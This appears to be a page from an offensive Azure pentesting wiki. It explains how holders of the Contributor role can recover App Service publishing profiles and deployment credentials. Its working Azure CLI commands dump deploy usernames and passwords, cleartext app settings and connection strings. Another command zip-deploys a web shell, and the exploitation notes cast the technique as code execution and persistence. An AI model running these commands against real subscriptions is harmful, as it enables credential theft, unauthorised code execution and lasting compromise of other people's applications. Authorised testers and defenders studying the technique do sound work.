---
title: "Deployment credentials: publishing profiles that push code"
description: "Recovering App Service publishing profiles and deployment credentials to push code and read config."
keywords:
  - deployment credentials
  - publishing profile
  - App Service
  - code push
  - config
---

# Deployment credentials

App Service **publishing credentials** authenticate code deploys over msdeploy, FTP, and the SCM site. With `Microsoft.Web/sites/publishxml/action` (Contributor includes it), the publishing profile is readable and hands over the deploy username, password, and endpoints, which is enough to push a web shell and to read the app's configuration.

## Reading the publishing profile

```bash
# full profile with msdeploy/FTP credentials
az webapp deployment list-publishing-profiles -g <rg> -n <app> --xml
# the SCM site-level credentials
az webapp deployment list-publishing-credentials -g <rg> -n <app> \
  --query '{user:publishingUserName,pass:publishingPassword}'
# app settings and connection strings in cleartext
az webapp config appsettings list -g <rg> -n <app>
az webapp config connection-string list -g <rg> -n <app>
```

## Deploying a web shell

```bash
# zip-deploy a handler that runs in the app context
az webapp deploy -g <rg> -n <app> --src-path shell.zip --type zip
```

## Exploitation notes

- The publishing password authenticates to [Kudu/SCM](kudu-and-scm.md) directly, so a recovered profile is a shell.
- `appsettings`/`connection-string list` return secrets in cleartext unless Key Vault references are used; even then the reference target is disclosed.
- A pushed package persists until redeployed, so this is both execution and persistence.

## Tools

- **Azure CLI** (`az webapp deployment`, `az webapp config`, `az webapp deploy`).
- **MicroBurst** (`Get-AzPasswords`): bulk publishing-profile and app-setting extraction.

## References

- [HackTricks Cloud: Azure App Service deployment](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: deployment credentials for App Service](https://learn.microsoft.com/azure/app-service/deploy-configure-credentials)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
